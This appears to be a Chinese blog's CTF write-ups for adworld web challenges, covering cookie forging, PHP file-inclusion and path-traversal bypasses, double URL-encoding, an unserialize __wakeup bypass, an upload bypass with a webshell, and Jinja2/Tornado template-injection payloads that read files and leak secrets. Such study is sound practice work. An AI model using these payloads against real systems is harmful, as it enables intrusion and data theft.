<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;br/&gt;'</span>);</span>

<span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">'O:5:"human":10:&#123;s:8:"xueliang";i:830;s:5:"neili";i:602;s:5:"lidao";i:95;s:6:"dingli";i:63;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:200000;s:4:"flag";s:1:"0";&#125;'</span>;</span>
<span class="actionscript"><span class="hljs-comment">//反编码获取cookie</span></span>
<span class="actionscript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">""</span>;</span>
for (i = 0;i&lt;result3.length;i++)&#123;
	num = result3[i].charCodeAt();
	num = num + ((i % 10) + 2);
	num = num ^ i;
<span class="javascript">	result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
<span class="actionscript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span>

<span class="actionscript"><span class="hljs-comment">//将cookie进行url编码</span></span>
<span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"cookie:"</span>+temp+<span class="hljs-string">"&lt;/br&gt;"</span>);</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>



<p>编码结果</p>
<div class="hljs"><pre><code class="hljs gcode">UTw<span class="hljs-number">7</span>PCxqe<span class="hljs-number">3</span>FjcC<span class="hljs-number">42</span>OThOjWtSUFYwb<span class="hljs-name">m99</span>amlzb<span class="hljs-name">G0</span>wI<span class="hljs-number">3</span>MeHBsUZ<span class="hljs-number">1</span>liZxQMWEFDXl<span class="hljs-number">8</span>EdUUOCgACd<span class="hljs-number">016</span>B<span class="hljs-number">34</span>WUlFWWTVoATEAAXF<span class="hljs-number">5</span>P<span class="hljs-number">3</span>Z<span class="hljs-number">2</span>CmYgPTY<span class="hljs-number">5</span>Pj<span class="hljs-number">90</span>FSUUaGUfL<span class="hljs-number">2</span>Z<span class="hljs-symbol">nYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4</span>FXEcXREo<span class="hljs-meta">%</span><span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB<span class="hljs-meta">%</span><span class="hljs-number">2</span>BH<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bps<span class="hljs-number">3</span><span class="hljs-symbol">nsLrP6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-meta">%</span><span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>X<span class="hljs-symbol">nJnkjNPf0</span><span class="hljs-symbol">NnRjpPD7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>k<span class="hljs-symbol">NTK0</span>dea<span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu<span class="hljs-meta">%</span><span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D</code></pre></div>

<p>这就是我们期待的cookie,然后用工具修改cookie</p>
<p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" srcset="/img/loading.gif" alt="nt-9.png"></p>
<p>修满属性值打怪拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" srcset="/img/loading.gif" alt="mt-10.png"></p>
<p><a href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242" target="_blank" rel="noopener">参考</a></p>
<p>这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>php</tag>
        <tag>cookie</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>adworld</title>
    <url>/2020/11/30/adworld/</url>
    <content><![CDATA[<p>为了完成网安作业必须多做点题，顺便写wp</p>
<a id="more"></a>

<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>利用php伪协议上传一段php代码后执行，列出目录看到flag文件</p>
<img src="https://i.loli.net/2020/12/04/ApRxaQX5nhbdD87.png" srcset="/img/loading.gif" alt="image-20201204225248794" style="zoom:50%;">



<p>再利用本地文件包含读取flag</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://220.249.52.133:46457/?page=http://127.0.0.1/index.php/?hello=<span class="hljs-number">%3</span>C?show_source(<span class="hljs-number">%22</span>fl4gisisish3r3.php<span class="hljs-number">%22</span>);?<span class="hljs-number">%3</span>E</code></pre></div>





<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>查看源码看到source.php，访问看到源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span>
<span class="hljs-class">    </span>&#123;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span></span>
<span class="hljs-function">        </span>&#123;
            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];
            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
            &#125;

            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            &#125;

            $_page = mb_substr(
                $page,
                <span class="hljs-number">0</span>,
                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
            );
            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            &#125;

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                <span class="hljs-number">0</span>,
                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
            );
            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            &#125;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125;
    &#125;

    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])
        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])
        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])
    ) &#123;
        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];
        <span class="hljs-keyword">exit</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;
    &#125;  
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>源码中有一个hint.php，查看得到</p>
<div class="hljs"><pre><code class="hljs smali">flag<span class="hljs-built_in"> not </span>here,<span class="hljs-built_in"> and </span>flag in ffffllllaaaagggg</code></pre></div>

<p>访问 <code>ffffllllaaaagggg</code>，发现没有这个文件，所以可能是在根目录。</p>
<p>继续看代码有个白名单</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">source</span><span class="hljs-selector-class">.php</span>,<span class="hljs-selector-tag">hint</span><span class="hljs-selector-class">.php</span></code></pre></div>

<p>mb_substr函数会截取<code>?</code>前面的字符返回给page，检测其是否在白名单中</p>
<p>注意这里有一个urldecode()，所以提交前需要进行两次urlencode</p>
<p>解码后重复上面两步</p>
<div class="hljs"><pre><code class="hljs php">$_page = mb_substr($_page,<span class="hljs-number">0</span>,mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>));
<span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;
   <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
&#125;</code></pre></div>

<p>之后通过include函数获取flag</p>
<p>所以构造的payload中url解码后?前的内容必须是  <code>source.php</code>或者<code>hint.php</code></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs awk">GET:
?page=hint.php%<span class="hljs-number">253</span>F<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre></div>

<p>原理是<code>hint.php?/</code>被当作目录</p>
<p>../是返回上一级目录，这里多几个../也没事，必须保证返回到根目录，而在根目录向上返回还是根目录。</p>
<p>所以上面的payload可以在根目录读取到flag。</p>
<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件打开后显示有乱码，但是可以看到<code>&lt;script&gt;</code>标签，于是改后缀伪html ,在浏览器打开，出现一个输入框。</p>
<p>继续看代码，看到函数的最后有个<code>eval</code>函数，中间的参数为eval(_)，正好与开头定义的名相同<code>&lt;script&gt;_=&#39;function</code>，所以想办法把原函数显示处理</p>
<p>将eval改为alert，保存后在浏览器中打开看到弹框中出现源码。</p>
<p>在线格式化后的结果</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"c"</span>).value;
    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;
        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">"fl"</span>, <span class="hljs-string">"s_a"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"e&#125;"</span>];
        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"_h0l"</span>, <span class="hljs-string">"n"</span>];
        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">"g&#123;"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"_0"</span>];
        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">"it'"</span>, <span class="hljs-string">"_"</span>, <span class="hljs-string">"n"</span>];
        <span class="hljs-keyword">var</span> s = [t, n, r, i];
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;
            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);
            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
        &#125;
    &#125;
&#125;
<span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);
<span class="hljs-keyword">delete</span> _</code></pre></div>

<p>再看这段js代码中的if语句</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>)</code></pre></div>

<p>参数e的长度为16，其中要包含</p>
<div class="hljs"><pre><code class="hljs angelscript">be0f23开头  <span class="hljs-number">233</span>ac   e98aa结尾     c7be9</code></pre></div>

<p>通过if语句后会通过一个算法将flag算出来</p>
<p>ok,那就按if语句的要求写出e</p>
<div class="hljs"><pre><code class="hljs plain">be0f233ac7be98aa</code></pre></div>

<p>还可以直接利用</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">"fl"</span>, <span class="hljs-string">"s_a"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"e&#125;"</span>];
      <span class="hljs-keyword">var</span> n = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"_h0l"</span>, <span class="hljs-string">"n"</span>];
      <span class="hljs-keyword">var</span> r = [<span class="hljs-string">"g&#123;"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"_0"</span>];
      <span class="hljs-keyword">var</span> i = [<span class="hljs-string">"it'"</span>, <span class="hljs-string">"_"</span>, <span class="hljs-string">"n"</span>];
      <span class="hljs-keyword">var</span> s = [t, n, r, i];
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;
          <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);
          s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
      &#125;</code></pre></div>

<p>在浏览器的console中运行</p>
<p><img src="https://i.loli.net/2020/12/01/fA5vLyShNcro2Ow.png" srcset="/img/loading.gif" alt="image-20201201230236591"></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span><span class="hljs-params">($str)</span></span>&#123;
    $_o=strrev($str);
    <span class="hljs-comment">// echo $_o;</span>
        
    <span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;
       
        $_c=substr($_o,$_0,<span class="hljs-number">1</span>);
        $__=ord($_c)+<span class="hljs-number">1</span>;
        $_c=chr($__);
        $_=$_.$_c;   
    &#125; 
    <span class="hljs-keyword">return</span> str_rot13(strrev(base64_encode($_)));
&#125;

highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">/*</span>
<span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span>
<span class="hljs-comment">*/</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>了解几个函数的用法</p>
<blockquote>
<p>str_rot13() 函数对字符串执行 ROT13 编码。</p>
<p>ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</p>
<p><strong>提示：</strong>编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。</p>
<p>strrev() 函数反转字符串。</p>
</blockquote>
<p><img src="https://i.loli.net/2020/12/01/LMmUQRWEsx8jceg.png" srcset="/img/loading.gif" alt="image-20201201232139218"></p>
<p>解密脚本</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$str = <span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span>&#123;
    $s = base64_decode(strrev(str_rot13($str)));
    <span class="hljs-comment">//echo($s);</span>
    <span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($s);$_0++)&#123;
        $_c=substr($s,$_0,<span class="hljs-number">1</span>);
        $__=ord($_c)<span class="hljs-number">-1</span>;
        $_c=chr($__);
        $_=$_.$_c;
    &#125;
    <span class="hljs-keyword">echo</span> strrev($_);
&#125;
decode($str);
<span class="hljs-meta">?&gt;</span></code></pre></div>



<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>这题应该给个提示的，访问index.phps获取源码。</p>
<p>phps，用御剑和dirsearch都扫不出来，所以必须知道才可能做出来。</p>
<p>给新生赛出题的想法来源，当时做这题的时候费了好大劲才找到index.phps，所以也让让萌新们体验一下找不到的绝望🤣</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-string">"admin"</span>===$_GET[id]) &#123;
  <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);
  <span class="hljs-keyword">exit</span>();
&#125;

$_GET[id] = urldecode($_GET[id]);
<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"admin"</span>)
&#123;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;
&#125;
<span class="hljs-meta">?&gt;</span>

Can you anthenticate to this website?</code></pre></div>



<p>获取id后urldecode之后再赋值给id，要注意上传的参数浏览器会字段一次urldecode，所以这里的admin需要两次urlencode</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs xquery">admin
<span class="hljs-meta">%61</span><span class="hljs-meta">%64</span><span class="hljs-meta">%6D</span><span class="hljs-meta">%69</span><span class="hljs-meta">%6E</span>
<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span>
GET:
<span class="hljs-built_in">?id</span>=<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span></code></pre></div>



<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>很简单的unserialize</p>
<p>利用漏洞，当属性值大于真是属性值的时候会跳过wakeup函数，php版本小于5.6</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
<span class="hljs-comment">// public function __wakeup()&#123;</span>
<span class="hljs-comment">//     exit('bad requests');</span>
<span class="hljs-comment">// &#125;</span>
&#125;

$c = <span class="hljs-keyword">new</span> xctf();
<span class="hljs-keyword">echo</span>(serialize($c));
<span class="hljs-meta">?&gt;</span></code></pre></div>

<div class="hljs"><pre><code class="hljs groovy"><span class="hljs-string">O:</span><span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;&#125;

<span class="hljs-string">GET:</span>
?code=O:<span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;&#125;</code></pre></div>



<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>抓包修改MIME为image/jpeg,即可上传成功，之后蚁剑连接拿到flag。</p>
<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>模板注入，和cumtctf华为杯很像，但是没那个难。</p>
<p>首先判断是否存在模板注入，在url后输入 49，显示页面如下，可以确定存在模板注入，因为我们输入的值被其当作变量带入计算。</p>
<p><img src="https://i.loli.net/2020/12/02/NyPSIhg9Yv4Jbzp.png" srcset="/img/loading.gif" alt="20201202085851.png"></p>
<p>模板注入原理这篇博客写的很详细：<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
<p>几个常用的魔术方法</p>
<blockquote>
<p>_<em>class_</em>  返回类型所属的对象 </p>
<p>_<em>mro_</em>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</p>
<p> _<em>base_</em>   返回该对象所继承的基类 // <strong>base</strong>和<strong>mro</strong>都是用来寻找基类的 </p>
<p>_<em>subclasses_</em>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 </p>
<p>_<em>init_</em>  类的初始化方法</p>
<p> _<em>globals_</em>  对包含函数全局变量的字典的引</p>
<p>直接开始这题</p>
</blockquote>
<p>1.查看所有模块，其中第41个模块file和72个模块，包含文件读取的相关操作，可以利用</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre></div>



<p><img src="https://i.loli.net/2020/12/02/j9Ahcr8sOaSyEPt.png" srcset="/img/loading.gif" alt="image-20201202090652367"></p>
<p>2.列出文件目录</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__['os'].listdir(<span class="hljs-name">'.'</span>)&#125;&#125;</code></pre></div>



<p><img src="https://i.loli.net/2020/12/02/hSIWxNvpBwqe2Qt.png" srcset="/img/loading.gif" alt="image-20201202094836434"></p>
<p>3.读取flag</p>
<div class="hljs"><pre><code class="hljs markdown">''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">'fl4g'</span>).read()</code></pre></div>

<p><img src="https://i.loli.net/2020/12/02/Qxdc9U1GbrzYvSg.png" srcset="/img/loading.gif" alt="image-20201202094926424"></p>
<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p><strong>Tornado</strong>全称<strong>Tornado Web Server</strong>，是一个用<a href="https://zh.m.wikipedia.org/wiki/Python" target="_blank" rel="noopener">Python</a>语言写成的<a href="https://zh.m.wikipedia.org/wiki/Web服务器" target="_blank" rel="noopener">Web服务器</a>兼<a href="https://zh.m.wikipedia.org/wiki/Web应用框架" target="_blank" rel="noopener">Web应用框架</a>，由FriendFeed公司在自己的网站<a href="https://zh.m.wikipedia.org/wiki/FriendFeed" target="_blank" rel="noopener">FriendFeed</a>中使用，被<a href="https://zh.m.wikipedia.org/wiki/Facebook" target="_blank" rel="noopener">Facebook</a>收购以后框架以<a href="https://zh.m.wikipedia.org/wiki/开源软件" target="_blank" rel="noopener">开源软件</a>形式开放给大众。</p>
<p>这又是web服务器和web应用框架，会不会和flask框架一样存在模板模板注入</p>
<h3 id="0x1原理"><a href="#0x1原理" class="headerlink" title="0x1原理"></a><strong>0x1原理</strong></h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。</p>
<h3 id="0x2解题"><a href="#0x2解题" class="headerlink" title="0x2解题"></a>0x2解题</h3><p>1.先看看题目给的连接</p>
<div class="hljs"><pre><code class="hljs sas">http://220.249.52.133:43538/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/welcome.txt<span class="hljs-variable">&amp;filehash</span>=34b3f8fdcf2ec4394a5b9b20580c0096</code></pre></div>

<p>提交的参数是文件名和文件的hash值</p>
<p>并且给了三web页面</p>
<div class="hljs"><pre><code class="hljs jboss-cli"><span class="hljs-string">/flag.txt</span>
<span class="hljs-string">/welcome.txt</span>
<span class="hljs-string">/hints.txt</span></code></pre></div>

<p>flag.txt</p>
<div class="hljs"><pre><code class="hljs jboss-cli">flag in <span class="hljs-string">/fllllllllllllag</span></code></pre></div>

<p>hints.txt给的提示</p>
<div class="hljs"><pre><code class="hljs stylus">/hints.txt
<span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre></div>

<p>这就知道了<code>filehash</code>的来源了</p>
<p>2.读取flag.txt就必须构造payload：</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>?filename=<span class="hljs-regexp">/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/</span>fllllllllllllag))</code></pre></div>

<p>但是我们不知道cookie_secret 的值，先提交试试</p>
<p><img src="https://i.loli.net/2020/12/02/7GzhFyxqJT9ZwNH.png" srcset="/img/loading.gif" alt="image-20201202100637168"></p>
<p>出现了这个错误页面，并且我们可以控制msg的值，存在模板注入</p>
<p>3.输入<code>msg={{handler.settings}}</code>,获取当前的环境变量，得到cookie_sercet的值 </p>
<p><img src="https://i.loli.net/2020/12/02/CijHGvlO7Pft8ur.png" srcset="/img/loading.gif" alt="image-20201202101520762"></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$filename = md5(<span class="hljs-string">'/fllllllllllllag'</span>);
$s = <span class="hljs-string">'cb82b218-07e3-491d-a302-532dbae27e6a'</span>;
<span class="hljs-keyword">echo</span> md5($s.$filename);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>于是构造出payload</p>
<div class="hljs"><pre><code class="hljs routeros">
?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275</code></pre></div>

<p>拿到flag</p>
<p>参考:<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" target="_blank" rel="noopener">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a></p>
<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><div class="hljs"><pre><code class="hljs php">import flask
import os

app = flask.Flask(__name__)
app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)


@app.route(<span class="hljs-string">'/'</span>)
def index():
    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()

@app.route(<span class="hljs-string">'/shrine/&lt;path:shrine&gt;'</span>)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)
        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s

    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(debug=<span class="hljs-keyword">True</span>)</code></pre></div>

<h3 id="0x1考察点"><a href="#0x1考察点" class="headerlink" title="0x1考察点"></a>0x1考察点</h3><p>很明显的flask框架</p>
<p>存在模板注入，但是对()进行了过滤，并将config , self 加入了黑名单，<code>Web_python_template_injection</code>这题的payload就没法用了。</p>
<p><img src="https://i.loli.net/2020/12/02/JT7Wnk3u86IVHQe.png" srcset="/img/loading.gif" alt="image-20201202103810281"></p>
<h3 id="0x2构造payload"><a href="#0x2构造payload" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>可以使用内置函数<code>get_flashed_messages()</code>，又因为config在current_app里面，所以我们可以构造payload</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre></div>



